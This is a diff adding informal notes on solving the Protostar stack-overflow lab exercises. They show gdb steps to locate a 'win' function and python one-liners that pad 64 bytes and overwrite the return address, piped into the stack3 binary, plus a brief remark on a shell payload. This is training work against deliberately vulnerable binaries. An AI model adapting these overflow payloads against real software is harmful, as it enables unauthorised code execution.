@@ -1,0 +1,42 @@
+#protostar
+
+>settings -> network -> Attached to "Bridged adapter"
+                     -> Allow all connections
+                     
+# 2
+export GREENIE=$(python -c 'print"a"*64+"\x0a\x0d\x0a\x0d"')
+
+# 3
+after opening with gdb
+
+method 1 for finding win address:
+disassemble win to see the address:
+x08048424
+
+method 2
+x win  (meaning examine win function)
+
+then using python trying to immitate the address after the 64th byte:
+python -c 'print"a"*64+"\x24\x84\x04\x08"'
+
+method 1:
+export GREENIE=$(python -c 'print"a"*64+"\x24\x84\x04\x08"')
+echo $GREENIE | ./stack3
+
+method 2
+python -c 'print"a"*64+"\x24\x84\x04\x08"' | ./stack3
+
+    #another way of solving #3 is to check the status of registers before the instruction "call eax"
+    #this could be done using the command in gdb:
+    info registers   // or simply  "i r" without the quotes
+    
+    #this means in order to call the win function the address needs to be written into the eax registers
+    
+
+    
+# 4
+&win => 0x80483f4
+
+# 5
+in my case it tends to work for the final payload without the
+added return address to the stack rather only the addrress works fine to execute the shell
